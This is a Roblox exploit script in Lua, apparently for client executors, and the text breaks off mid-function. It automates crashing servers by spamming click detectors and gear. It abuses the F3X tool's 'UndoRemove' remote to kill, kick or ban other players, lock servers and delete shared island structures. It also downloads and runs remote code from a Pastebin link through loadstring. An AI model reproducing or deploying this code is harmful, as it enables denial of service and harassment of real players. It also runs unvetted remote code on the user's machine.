--hello before using this i didn't actually credit anyone in this script because this may have some people i don't know.


local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
_G.crashselected = false
local targets = {"install","old ROBLOX plugin"} -- ignore this one
local function tempcrash()
fireclickdetector(workspace.FoxBinMK5.Model.Dispenser.Dispenser.Buttons.Custom["1"].ClickDetector)
fireclickdetector(workspace.FoxBinMK5.Model.Dispenser.Dispenser.Buttons.Custom["2"].ClickDetector)
fireclickdetector(workspace.FoxBinMK5.Model.Dispenser.Dispenser.Buttons.Custom["3"].ClickDetector)
fireclickdetector(workspace.FoxBinMK5.Model.Dispenser.Dispenser.Buttons.Custom["4"].ClickDetector)
fireclickdetector(workspace.FoxBinMK5.Model.Dispenser.Dispenser.Buttons.Custom["5"].ClickDetector)
fireclickdetector(workspace.FoxBinMK5.Model.Dispenser.Dispenser.Buttons.Custom["6"].ClickDetector)
fireclickdetector(workspace.FoxBinMK5.Model.Dispenser.Dispenser.Buttons.Custom["7"].ClickDetector)
fireclickdetector(workspace.FoxBinMK5.Model.Dispenser.Dispenser.Buttons.Custom["8"].ClickDetector)
fireclickdetector(workspace.FoxBinMK5.Model.Dispenser.Dispenser.Buttons.Custom["9"].ClickDetector)
fireclickdetector(workspace.FoxBinMK5.Model.Dispenser.Dispenser.Buttons.Custom["10"].ClickDetector)
fireclickdetector(workspace.FoxBinMK5.Model.Dispenser.Dispenser.Buttons.Custom["11"].ClickDetector)
fireclickdetector(workspace.FoxBinMK5.Model.Dispenser.Dispenser.Buttons.Custom["12"].ClickDetector)
fireclickdetector(workspace.FoxBinMK5.Model.Dispenser.Dispenser.Buttons.Custom["13"].ClickDetector)
fireclickdetector(workspace.FoxBinMK5.Model.Dispenser.Dispenser.Buttons.Custom["14"].ClickDetector)
fireclickdetector(workspace.FoxBinMK5.Model.Dispenser.Dispenser.Buttons.Custom["15"].ClickDetector)
fireclickdetector(workspace.FoxBinMK5.Model.Dispenser.Dispenser.Buttons.Custom["16"].ClickDetector)
fireclickdetector(workspace.FoxBinMK5.Model.Dispenser.Dispenser.Buttons.Custom["17"].ClickDetector)
end
_G.teleport = function()
        local servers = {}
                local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
                local contents = readfile("ServersHopped.txt")
                contents = contents:split("\n")
                while true do 
            spawn(function()
                
            req = httprequest({Url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100", game.PlaceId)})
            body = game:GetService'HttpService':JSONDecode(req.Body)
		if body and body.data then
			for i, v in next, body.data do
				if type(v) == "table" and v.id ~= game.JobId and v.playing < 6 then
                    if not table.find(contents, v.id) then 
					table.insert(servers, v.id)
                    end
                
				end
			end
		end
		if #servers > 0 then
            
			game:GetService'TeleportService':TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], game.Players.LocalPlayer)
		else
            
			error("No servers found, reattempting..")
    
		end    
    end)
        wait(.2)
    end        
    end
if _G.crashselected then
if not _G.RenderingEnabled then 
            coroutine.wrap(function()
                wait(.2)
            game:GetService("RunService"):Set3dRenderingEnabled(false)
            end)()
                end
        
        local file = isfile("ServersHopped.txt")
        local file2 = isfile("ServersCrashed.txt")
        local file3 = isfile("ServersSkipped.txt")
        if file then 
            warn("file loaded")
        else
           -- rconsoleerr("Creating file ServersHopped.txt...\n")
            writefile("ServersHopped.txt", "i got muted in sc fun\n")
        end 

        if file2 then 
            warn("file2 loaded")
            else
                --rconsoleerr("Creating file ServesrCrashed.txt...\n")
                writefile("ServersCrashed.txt", "0\n")
            end 

            if file3 then 
                warn("file3 loaded")
                else
                   -- rconsoleerr("Creating file ServersSkipped.txt...\n")
                    writefile("ServersSkipped.txt", "0\n")
                end 
                
        


    
        spawn(function()
        loadstring(game:HttpGet(("https://pastebin.com/raw/yjFbhgVJ"), true))()
        end)
        spawn(function()
             
            wait(30)
            if _G.crashed == false then
           -- rconsoleerr("Something went wrong, hopping servers..\n")  
            appendfile("ServersHopped.txt", game.JobId.."\n")  
      _G.teleport()
            end
                end)
    _G.contents2 = readfile("ServersCrashed.txt"):split("\n")
        _G.contents3 = readfile("ServersSkipped.txt"):split("\n")
    if not workspace.FoxBinMK5.Model.Dispenser.Dispenser.Buttons.Custom["1"] then
    skipped = tonumber(_G.contents3[1]) + 1
    writefile("ServersSkipped.txt", tostring(skipped).."\n")    
    appendfile("ServersHopped.txt", game.JobId.."\n")     
    wait()
        _G.teleport()
    end
repeat task.wait() until game:IsLoaded() == true
local whitelisted = {}
for i, v in pairs(game.Players:GetPlayers()) do
    if not found then
        if table.find(whitelisted, v.Name) then
            print("Whitelisted Player Found: " .. v.Name)
            found = true
            appendfile("ServersHopped.txt", game.JobId.."\n")  
    skipped = tonumber(_G.contents3[1]) + 1
    writefile("ServersSkipped.txt", tostring(skipped).."\n")    
            repeat
                task.wait()
                _G.teleport()
            until false
        end
    end
end

if not found then
for i,v in pairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") then
			v.CanCollide = false
			v.CanTouch = false
			v.Transparency = 1
		end
end
local root = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
if workspace["FoxBin'sDjBoard"].Brain.MainWall then
    root.CFrame = workspace["FoxBin'sDjBoard"].Brain.MainWall.CFrame
wait(0.5)
local args = {
    [1] = "PlaySound",
    [2] = 9044604287
}
game:GetService("ReplicatedStorage"):WaitForChild("WorkspaceAPI"):FireServer(unpack(args))
fireclickdetector(workspace:FindFirstChild("Baseplate"):FindFirstChild("night"):FindFirstChild('ClickDetector'))
    game.Players:Chat("fogend nil")
    game.Players:Chat("fogcolor 0 0 0")
    local targets = {"install","old ROBLOX plugin"}
    end
    if workspace.FoxBinMK5.Model.Dispenser.Dispenser.Buttons.Custom["1"] then
    root.CFrame = CFrame.new(-452,-11,-131)
    local part = Instance.new("Part")
            part.Size = Vector3.new(10, 1, 10)
            part.Position = Vector3.new(root.Position.X, -20, root.Position.Z)
            part.Anchored = true
            part.CanCollide = true
            part.Transparency = 0.5
            part.BrickColor = BrickColor.new("Really black")
            part.Parent = game.Workspace
            _G.lastserverlive = part
    wait(0.8)
local RunService = game:GetService("RunService")
    for i = 1,40 do local args = {
    [1] = "SetGear",
    [2] = "561245776"
}

game:GetService("ReplicatedStorage"):WaitForChild("WorkspaceAPI"):FireServer(unpack(args))
end
end
spawn(function()
    while true do
        for _, name in pairs(targets) do
            local success, err = pcall(function()
                local obj = workspace:FindFirstChild(name)
                if obj then
                    obj:Destroy()
                    print("Deleted workspace." .. name)
                end
            end)
            if not success then
                warn("Error deleting " .. name .. ": " .. tostring(err))
            end
        end
        wait()
    end
end)
for i = 1,20 do  tempcrash()end
wait(1)
    repeat
        _G.teleport()
        task.wait(1.5)
    until false
end return end
local player = Players.LocalPlayer
local userId = player.UserId
local Textbox_Settings = {
    Prefix = "/e ", -- Prefix to use Textbox
    Transparency = 0.8, -- 0.8 Default
    TextSize = 14 -- 14 Default
}
local starttime1 = os.clock()
local ScreenGui = Instance.new("ScreenGui")
local TextBox = Instance.new("TextBox")
local UIToolsGradient = Instance.new("UIGradient")

--Properties:

ScreenGui.Parent = game:GetService("CoreGui")

TextBox.Parent = ScreenGui
TextBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextBox.BackgroundTransparency = Textbox_Settings.Transparency
TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextBox.BorderSizePixel = 0
TextBox.Position = UDim2.new(0, 0, 0.643999994, 0)
TextBox.Size = UDim2.new(0, 135, 0, 29)
TextBox.ClearTextOnFocus = true
TextBox.Font = Enum.Font.Arial
TextBox.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
TextBox.Text = "Command Here"
TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
TextBox.TextSize = Textbox_Settings.TextSize

UIToolsGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(127, 10, 12)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(191, 64, 0))}
UIToolsGradient.Name = "UIToolsGradient"
UIToolsGradient.Parent = TextBox
local debounce = false

TextBox.FocusLost:Connect(function()
    if debounce then return end
    debounce = true
    game.Players:Chat(TextBox.Text)
    wait(0.2) -- adjust the wait time as needed
    debounce = false

end)

plr = game.Players.LocalPlayer

local hum = plr.Character:FindFirstChild("HumanoidRootPart")
mouse = plr:GetMouse()
mouse.KeyDown:connect(function(key)
    if key == Textbox_Settings.Prefix then
        TextBox:CaptureFocus()
        task.wait(.0000000000000000000000000000000)
        TextBox.Text = " "
    end
end)
--[[https://api.ipify.org/]]

--[[ GitHub RAW link to your JSON whitelist
local whitelistUrl = "https://raw.githubusercontent.com/Bobrocks12330/LPISHITTER/main/Whitelist"

-- Fetch whitelist data
local success, response = pcall(function()
    return HttpService:JSONDecode(game:HttpGet(whitelistUrl))
end)

-- Check if the request was successful and valid
if not success or type(response) ~= "table" or not response.whitelist then
    warn("Failed to load whitelist. Access denied.")
    player:Kick("Whitelist could not be verified. Try again later.")
    return
end

-- Check if the player is in the whitelist
if not table.find(response.whitelist, userId) then
    warn("Player not whitelisted: " .. userId)
    player:Kick("You are not whitelisted to use this script.")
    return
end]]
print("Player is whitelisted. Loading GUI...")
local function clear()
for i = 1,40 do local args = {
[1] = "SetGear",
[2] = "0"
}
game:GetService("ReplicatedStorage"):WaitForChild("WorkspaceAPI"):FireServer(unpack(args)) end end
local function gear(bled, hikarumikary)
    local root = game.Players.LocalPlayer.Character.HumanoidRootPart
local oldpos = root.CFrame
root.CFrame = workspace.FoxBinMK5.Model.Dispenser.Dispenser.Wall.CFrame + Vector3.new(0, -20, 0) 
    local part = Instance.new("Part")
            part.Size = Vector3.new(10, 1, 10)
            part.Position = Vector3.new(root.Position.X, -20, root.Position.Z)
            part.Anchored = true
            part.CanCollide = true
            part.Transparency = 0.5
            part.BrickColor = BrickColor.new("Really black")
            part.Parent = game.Workspace
            _G.lastonealivewilllockthedoorr = part
clear()
            for i = 1,40 do local args = {
    [1] = "SetGear",
    [2] = bled
}

game:GetService("ReplicatedStorage"):WaitForChild("WorkspaceAPI"):FireServer(unpack(args)) end
wait(0.4)
for i = 1,hikarumikary do fireclickdetector(workspace.FoxBinMK5.Model.Dispenser.Dispenser.Buttons.Custom["1"].ClickDetector)
    end
root.CFrame = oldpos
clear()
_G.lastonealivewilllockthedoorr:Destroy()
end
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local admin = {prefix = "", version = "1.0"}
local hide = "                             "
local commands = {}
local Loops = {}
local plr = game.Players.LocalPlayer 
local chr = plr.Character
local descriptions = {}
local http = game:GetService("HttpService")
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local channel = TextChatService.TextChannels.RBXGeneral
local emoteCommand = TextChatService.TextChatCommands:WaitForChild("RBXEmoteCommand")
function cb(cmdName, cmdFunction)
commands[cmdName] = cmdName
channel.MessageReceived:Connect(function(msgg)
if msgg.TextSource and msgg.TextSource.UserId == plr.UserId then
    local msg = msgg.Text
            msg = msg:lower()
            args = msg:split(" ")
            if args[1] == admin.prefix .. cmdName then 
                cmdFunction()
            elseif args[1] == "/e" and args[2] == admin.prefix .. cmdName then
                args[2] = args[3]
                cmdFunction()
            end
    end
end)
emoteCommand.Triggered:Connect(function(textSource, msg)
    if textSource.UserId == player.UserId then
            msg = msg:lower()
            args = msg:split(" ")
            if args[1] == admin.prefix .. cmdName then 
                cmdFunction()
            elseif args[1] == "/e" and args[2] == admin.prefix .. cmdName then
                args[2] = args[3]
                cmdFunction()
            end
end
end)
end
function newHumanoid()
    Instance.new("Humanoid", plr.Character)
end
function GetPlayer(Target)
    local plrs = Players:GetPlayers()
    if Target:lower() == "all" then
        return plrs
    elseif Target:lower() == "others" then
        for index, plr in pairs(plrs) do
            if plr == game:service("Players").LocalPlayer then
                table.remove(plrs, index)
                return plrs
            end
        end
    elseif Target:lower() == "me" then
        return {game:service("Players").LocalPlayer}
    elseif Target:lower() == "bacons" then
        local baconPlayers = {}
        for _, plr in pairs(Players:GetPlayers()) do
            if plr.Character and (plr.Character:FindFirstChild('Pal Hair') or plr.Character:FindFirstChild('Kate Hair')) then
                table.insert(baconPlayers, plr)
            end
        end
        return baconPlayers
    else
        local plrTargets = {}
        for index, plr in pairs(plrs) do
            if plr.Name:sub(1, #Target):lower() == Target:lower() or plr.DisplayName:sub(1, #Target):lower() == Target:lower() then
                table.insert(plrTargets, plr)
            end
        end
        return plrTargets
    end
end
cb("cmds", function() 
print("the btools id is 550177512")
print("ban\nkick\ntoisland\nslock\nkill\nfling\ndelinv\nspeed\njumppower\nto\nautokill\nslockfriends\ndelallisland\ndisarm\nairwalk\nf3x\ndelgearboard\ndelmodel\ndelf3x\ndelmusic\ndelplate\ndelgearsave\ndelxmas\ndelbrick\ndelisland\ndelf3xhandler\ndelp2w\nantitool\nwl\nunwl\ninfgod\nantibug\nloadout\nregen\nregensp\nsink\nnd\nnojoint\nsit\ninvisf3x\nvoid\gear\nscream\ncage\nnop2w\np2w\nsbl\nmusiclock\nunmusiclock\nping\nfreeze\nbtools?\nfungear\nspamgear(2args)\ncrashpart\nbringparts\nbombox\nanticrash(this_works_with_crashpart)\ngs\nfarm\nunfarm\nresize\nbringparts\nfungear\nbring\nfungear\n//crash\n//vampirecrash\nreanim\nimport")
end)
cb("f3x", function() 
    gear(550177512,1)
end)
cb("toisland", function()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if hrp then
        hrp.CFrame = CFrame.new(32, 4.75, -84)
    end
end)
cb("kick", function()
    for _Index, Target in pairs(GetPlayer(args[2])) do
    local player = game.Players.LocalPlayer
    local players = game:GetService("Players")
    local function GetPath()
        local ToolName = "F3X" or "Building Tools"
        local Tool = player.Character:FindFirstChild(ToolName) or player.Backpack:FindFirstChild(ToolName)
        return Tool
    end
    local function Delete(instance, tool)
        tool:FindFirstChildOfClass("BindableFunction"):FindFirstChildOfClass("RemoteFunction"):InvokeServer("UndoRemove", {instance})
    end
    local function kick(Target)
        local Tool = GetPath()
        if not Tool then return end

        local function Task()
            Delete(Target, Tool)
        end
        if Tool.Parent == player.Backpack then
            Tool.Parent = player.Character
            task.wait(0.1)
            Task()
            task.wait(0.1)
            Tool.Parent = player.Backpack
        elseif Tool.Parent == player.Character then
            Task()
        end
    end
    kick(Target)
    end
end)
cb("ban", function()
    for _Index, Target in pairs(GetPlayer(args[2])) do
    local player = game.Players.LocalPlayer
    local players = game:GetService("Players")
    local function GetPath()
        local ToolName = "F3X" or "Building Tools"
        local Tool = player.Character:FindFirstChild(ToolName) or player.Backpack:FindFirstChild(ToolName)
        return Tool
    end
    local function Delete(instance, tool)
        tool:FindFirstChildOfClass("BindableFunction"):FindFirstChildOfClass("RemoteFunction"):InvokeServer("UndoRemove", {instance})
    end
    local function ban(Target)
        local Tool = GetPath()
        if not Tool then return end
        local function Task()
            Delete(Target, Tool)
        end
        if Tool.Parent == player.Backpack then
            Tool.Parent = player.Character
            task.wait(0.1)
            Task()
            task.wait(0.1)
            Tool.Parent = player.Backpack
        elseif Tool.Parent == player.Character then
            Task()
        end
    end
    local bannedPlayers = {}
bannedPlayers[Target.UserId] = true
ban(Target)
        players.PlayerAdded:Connect(function(newPlayer)
            if bannedPlayers[newPlayer.UserId] then
                ban(newPlayer)
            end
        end
        )
    end
end)
cb("slock", function()
    local player = game.Players.LocalPlayer
    local players = game:GetService("Players")
    _G.ServerLocked = not _G.ServerLocked
    local function GetPath()
        local ToolName = "F3X" or "Building Tools"
        local Tool = player.Character:FindFirstChild(ToolName) or player.Backpack:FindFirstChild(ToolName)
        return Tool
    end
    local function Delete(instance, tool)
        tool:FindFirstChildOfClass("BindableFunction"):FindFirstChildOfClass("RemoteFunction"):InvokeServer("UndoRemove", {instance})
    end
    local function kick(Target)
        local Tool = GetPath()
        if not Tool then return end
        local function Task()
            Delete(Target, Tool)
        end
        if Tool.Parent == player.Backpack then
            Tool.Parent = player.Character
            task.wait(0.1)
            Task()
            task.wait(0.1)
            Tool.Parent = player.Backpack
        elseif Tool.Parent == player.Character then
            Task()
        end
    end
    if _G.ServerLocked then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Server Locked",
            Text = "New players will be kicked!",
            Duration = 5
        })
        _G.LockConnection = players.PlayerAdded:Connect(function(newPlayer)
            kick(newPlayer)
        end)
    else
        -- Notify that the server is now unlocked
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Server Unlocked",
            Text = "New players can now join!",
            Duration = 5
        })
        -- Stop kicking new players
        if _G.LockConnection then
            _G.LockConnection:Disconnect()
            _G.LockConnection = nil
        end
    end
end)
cb("kill", function()
    for _Index, Target in pairs(GetPlayer(args[2])) do
    local player = game.Players.LocalPlayer
    local players = game:GetService("Players")
    local function GetPath()
        local ToolName = "F3X" or "Building Tools"
        local Tool = player.Character:FindFirstChild(ToolName) or player.Backpack:FindFirstChild(ToolName)
        return Tool
    end
    local function Delete(instance, tool)
        tool:FindFirstChildOfClass("BindableFunction"):FindFirstChildOfClass("RemoteFunction"):InvokeServer("UndoRemove", {instance})
    end
    local function kill(Target)
        local Tool = GetPath()
        if not Tool then return end
        local function Task()
            local character = Target.Character
            if character then
                local head = character:FindFirstChild("Head")
                local torso = character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("Torso")
                if head then Delete(head, Tool) end
                if torso then Delete(torso, Tool) end
            end
       end
        if Tool.Parent == player.Backpack then
            Tool.Parent = player.Character
            task.wait(0.1)
            Task()
            task.wait(0.1)
            Tool.Parent = player.Backpack
        elseif Tool.Parent == player.Character then
            Task()
        end
    end
    kill(Target)
    end
end)
OrgDestroyHeight = workspace.FallenPartsDestroyHeight
cb("fling", function()
for _Index, Target in pairs(GetPlayer(args[2])) do
    workspace.FallenPartsDestroyHeight = 0/1/0
_G.fling = true
power = 100
game:GetService('RunService').Stepped:connect(function()
game.Players.LocalPlayer.Character.Head.CanCollide = false
game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
end)
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local BodyAngularVelocity = Instance.new("BodyAngularVelocity")
BodyAngularVelocity.AngularVelocity = Vector3.new(10^6, 10^6, 10^6)
BodyAngularVelocity.MaxTorque = Vector3.new(10^6, 10^6, 10^6)
BodyAngularVelocity.P = 10^6
if not Target then return end
BodyAngularVelocity.Parent = LocalPlayer.Character.HumanoidRootPart
while Target.Character.HumanoidRootPart and LocalPlayer.Character.HumanoidRootPart and _G.fling do
   RunService.RenderStepped:Wait()
   LocalPlayer.Character.HumanoidRootPart.CFrame = Target.Character.Head.CFrame * LocalPlayer.Character.HumanoidRootPart.CFrame.Rotation
   LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new()
end
BodyAngularVelocity.Parent = nil
end end)
cb("unfling", function()
    game:GetService('RunService').Stepped:connect(function()
game.Players.LocalPlayer.Character.Head.CanCollide = true
game.Players.LocalPlayer.Character.UpperTorso.CanCollide = true
game.Players.LocalPlayer.Character.LowerTorso.CanCollide = true
game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = true
end)
_G.fling = false
workspace.FallenPartsDestroyHeight = OrgDestroyHeight
end)
cb("delinv", function() local player = game.Players.LocalPlayer  
local backpack = player:FindFirstChild("Backpack")  
if backpack then  
    for _, item in ipairs(backpack:GetChildren()) do  
        if item:IsA("Tool") then  
            item:Destroy()  
        end  
    end  
end end)
cb("speed", function()
    local player = game.Players.LocalPlayer
    local players = game:GetService("Players")
        local speedValue = tonumber(args[2])
        if speedValue then
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.WalkSpeed = speedValue
            end
        end
    end)
cb("jumppower", function()
    local player = game.Players.LocalPlayer
    local players = game:GetService("Players")
        local jumpValue = tonumber(args[2])
        if jumpValue then
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.JumpPower = jumpValue
            end
        end
    end)
cb("to", function()
    for _Index, Target in pairs(GetPlayer(args[2])) do
    local player = game.Players.LocalPlayer
    local players = game:GetService("Players")
    local function findClosestMatch(inputName)
        inputName = inputName:lower()
        for _, Target in pairs(players:GetPlayers()) do
            if Target.Name:lower():sub(1, #inputName) == inputName then
                return Target
            end
        end
        return nil
    end
    local function getRandomPlayer()
        local playerList = {}
        for _, Target in pairs(players:GetPlayers()) do
            if Target ~= player then
                table.insert(playerList, Target)
            end
        end
        return #playerList > 0 and playerList[math.random(1, #playerList)] or nil
    end
    local function teleportTo(Target)
        if not Target or not Target.Character then return end
        local TargetHrp = Target.Character:FindFirstChild("HumanoidRootPart")
        local myHrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
        if TargetHrp and myHrp then
            myHrp.CFrame = TargetHrp.CFrame + Vector3.new(0, 2, 0) -- Teleport slightly above them
        end
    end
        if Target.Character then
            teleportTo(Target)
        end
    end
end)
cb("autokill", function()
    local player = game.Players.LocalPlayer
    local players = game:GetService("Players")
    _G.F3XKillEnabled = not _G.F3XKillEnabled
    if _G.F3XKillEnabled then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "F3X Auto-Kill",
            Text = "Enabled - Killing non-friends with F3X",
            Duration = 5
        })
        _G.F3XKillConnection = players.PlayerAdded:Connect(function(Target)
            task.wait(1) -- Give time for their character to load
            if Target ~= player and not player:IsFriendsWith(Target.UserId) then
                local character = Target.Character or Target.CharacterAdded:Wait()
                local f3xTool = character:FindFirstChild("F3X") or Target.Backpack:FindFirstChild("F3X")

                if f3xTool then
                    local Tool = player.Backpack:FindFirstChild("F3X") or player.Character:FindFirstChild("F3X")
                    if Tool then
                        local function Delete(instance)
                            local remote = tool:FindFirstChildOfClass("BindableFunction"):FindFirstChildOfClass("RemoteFunction")
                            if instance and remote then
                                remote:InvokeServer("UndoRemove", {instance})
                            end
                        end

                        local head = character:FindFirstChild("Head")
                        local torso = character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("Torso")

                        if head then Delete(head) end
                        if torso then Delete(torso) end
                    end
                end
            end
        end)
    else
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "F3X Auto-Kill",
            Text = "Disabled",
            Duration = 5
        })
        if _G.F3XKillConnection then
            _G.F3XKillConnection:Disconnect()
            _G.F3XKillConnection = nil
        end
    end
end)
cb("slockfriends", function()
    local player = game.Players.LocalPlayer
    local players = game:GetService("Players")
    _G.ServerLocked = not _G.ServerLocked
    -- Custom Kick Function
    local function GetPath()
        local ToolName = "F3X" or "Building Tools"
        local Tool = player.Character:FindFirstChild(ToolName) or player.Backpack:FindFirstChild(ToolName)
        return Tool
    end
    local function Delete(instance, tool)
        tool:FindFirstChildOfClass("BindableFunction"):FindFirstChildOfClass("RemoteFunction"):InvokeServer("UndoRemove", {instance})
    end
    local function kick(Target)
        local Tool = GetPath()
        if not Tool then return end
        local function Task()
            Delete(Target, Tool)
        end
        if Tool.Parent == player.Backpack then
            Tool.Parent = player.Character
            task.wait(0.1)
            Task()
            task.wait(0.1)
            Tool.Parent = player.Backpack
        elseif Tool.Parent == player.Character then
            Task()
        end
    end
    if _G.ServerLocked then
        -- Notify that the server is locked
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Server Locked",
            Text = "Only friends can join!",
            Duration = 5
        })
        -- Kick new players who aren’t friends
        _G.LockConnection = players.PlayerAdded:Connect(function(newPlayer)
            task.wait(1) -- Give time for their character to load
            if not player:IsFriendsWith(newPlayer.UserId) then
                kick(newPlayer)
            end
        end)
    else-- Notify that the server is unlocked
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Server Unlocked",
            Text = "Anyone can now join!",
            Duration = 5
        })
        -- Stop kicking new players
        if _G.LockConnection then
            _G.LockConnection:Disconnect()
            _G.LockConnection = nil
        end
    end
end)
cb("kicknonfriends", function()
    local player = game.Players.LocalPlayer
    local players = game:GetService("Players")
    local function GetPath()
        local ToolName = "F3X" or "Building Tools"
        local Tool = player.Character:FindFirstChild(ToolName) or player.Backpack:FindFirstChild(ToolName)
        return Tool
    end
    local function Delete(instance, tool)
        tool:FindFirstChildOfClass("BindableFunction"):FindFirstChildOfClass("RemoteFunction"):InvokeServer("UndoRemove", {instance})
    end
    local function kick(Target)
        local Tool = GetPath()
        if not Tool then return end
        local function Task()
            Delete(Target, Tool)
        end
        if Tool.Parent == player.Backpack then
            Tool.Parent = player.Character
            task.wait(0.1)
            Task()
            task.wait(0.1)
            Tool.Parent = player.Backpack
        elseif Tool.Parent == player.Character then
            Task()
        end
    end
    for _, Target in pairs(players:GetPlayers()) do
        if Target ~= player and not player:IsFriendsWith(Target.UserId) then
            kick(Target)
        end
    end
end)
cb("delallisland", function()
    local player = game.Players.LocalPlayer
    local function GetPath()
        local ToolName = "F3X" or "Building Tools"
        local Tool = player.Character:FindFirstChild(ToolName) or player.Backpack:FindFirstChild(ToolName)
        return Tool
    end
    local function Delete(instance, tool)
        if instance and tool then
            local remote = tool:FindFirstChildOfClass("BindableFunction"):FindFirstChildOfClass("RemoteFunction")
            if remote then
                remote:InvokeServer("UndoRemove", {instance})
            end
        end
    end
    local function Task(Target)
for _, Target in pairs(Targets) do
                    if Target then Delete(Target, Tool) 
end end
    local function ExecuteDeletion(Targets)
        local Tool = GetPath()
        if Tool then
            if Tool.Parent == player.Backpack then
                Tool.Parent = player.Character
                task.wait(0.1)
                Task(Target)
                Tool.Parent = player.Backpack
            else
                Task(Target)
            end
        end
    end
end-- List of all objects to delete
    ExecuteDeletion({
        -- Gearboards
        workspace:FindFirstChild("made by FoxBin"),
        workspace:FindFirstChild("made by FoxBin1"),
        workspace:FindFirstChild("made byFoxBin MK2"),
        workspace:FindFirstChild("made by FoxBinMK4"),
        workspace:FindFirstChild("made by FoxBinMK6"),
        -- Model Inserter
        workspace:FindFirstChild("FoxBinMK5"),
        -- F3X Giver
        (function()
            local SafePlate = workspace:FindFirstChild("SafePlate")
            if SafePlate then
                for _, v in pairs(SafePlate:GetDescendants()) do
                    if v.Name == "Bricks" and v:FindFirstChild("Bar") then
                        return v.Parent
                    end
                end
            end
        end)(),
        -- Music Player
        (function()
            local MusicModel = workspace:FindFirstChild("FoxBin'sDjBoard")
            return MusicModel and MusicModel:FindFirstChild("Brain")
        end)(),
        -- Safe Plate
        workspace:FindFirstChild("SafePlate"),
        workspace:FindFirstChild("AdGui"),
        -- Gear Saves
        workspace:FindFirstChild("GearBoardManagerModel"),
        -- Xmas Parts
        workspace:FindFirstChild("Xmas Parts"),
        -- Bricks (Killbricks, Sky Changers, Island Shape Changers)
        workspace:FindFirstChild("Bricks"),
        -- Whole Island
        workspace:FindFirstChild("Baseplate"),
        workspace:FindFirstChild("Bricks"),
        -- F3X Handle
        (function()
            local Tool = GetPath()
            return Tool and Tool:FindFirstChild("Handle")
        end)()
    })
end)
cb("disarm", function()
    for _Index, Target in pairs(GetPlayer(args[2])) do
    local player = game.Players.LocalPlayer
    local players = game:GetService("Players")
    local function GetPath()
        local ToolName = "F3X" or "Building Tools"
        local Tool = player.Character:FindFirstChild(ToolName) or player.Backpack:FindFirstChild(ToolName)
        return Tool
    end
    local function Delete(instance, tool)
        tool:FindFirstChildOfClass("BindableFunction"):FindFirstChildOfClass("RemoteFunction"):InvokeServer("UndoRemove", {instance})
    end
    local function disarm(Target)
        local Tool = GetPath()
        if not Tool then return end
        local function Task()
            local character = Target.Character
            if character then
                for _, part in pairs(character:GetChildren()) do
                    if part:IsA("BasePart") and part.Name ~= "Head" and part.Name ~= "Torso" and part.Name ~= "HumanoidRootPart" then
                        Delete(part, Tool)
                    end
                end
            end
        end
        if Tool.Parent == player.Backpack then
            Tool.Parent = player.Character
            task.wait(0.1)
            Task()
            task.wait(0.1)
            Tool.Parent = player.Backpack
        elseif Tool.Parent == player.Character then
            Task()
        end
    end
                disarm(Target)
    end
end)
cb("airwalk", function()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local hrp = character.HumanoidRootPart
    if not _G.AirWalkEnabled then
            local part = Instance.new("Part")
            part.Size = Vector3.new(10, 1, 10)
            part.Position = Vector3.new(hrp.Position.X, -500, hrp.Position.Z)
            part.Anchored = true
            part.CanCollide = true
            part.Transparency = 0.5
            part.BrickColor = BrickColor.new("Really black")
            part.Parent = game.Workspace
            _G.AirWalkPart = part
        -- Keep the part following X and Z
        _G.AirWalkConnection = game:GetService("RunService").RenderStepped:Connect(function()
            if _G.AirWalkPart and player.Character and player.Character.HumanoidRootPart then
                _G.AirWalkPart.Position = Vector3.new(hrp.Position.X, -500, hrp.Position.Z)
            end
        end)
        -- Ensure it persists after death
        player.CharacterAdded:Connect(function(newCharacter)
            hrp = newCharacter.HumanoidRootPart
            _G.AirWalkPart.Position = Vector3.new(hrp.Position.X, -500, hrp.Position.Z)
        end)
    else
        -- Disable Air Walk
        if _G.AirWalkConnection then
            _G.AirWalkConnection:Disconnect()
            _G.AirWalkConnection = nil
        if _G.AirWalkPart then
            _G.AirWalkPart:Destroy()
            _G.AirWalkPart = nil
        end
        end
    end
end)
local function GetPath()
    local player = game.Players.LocalPlayer
    local ToolName = "F3X" or "Building Tools"
    return player.Character:FindFirstChild(ToolName) or player.Backpack:FindFirstChild(ToolName)
end
local function Delete(instance, tool)
    if instance and tool then
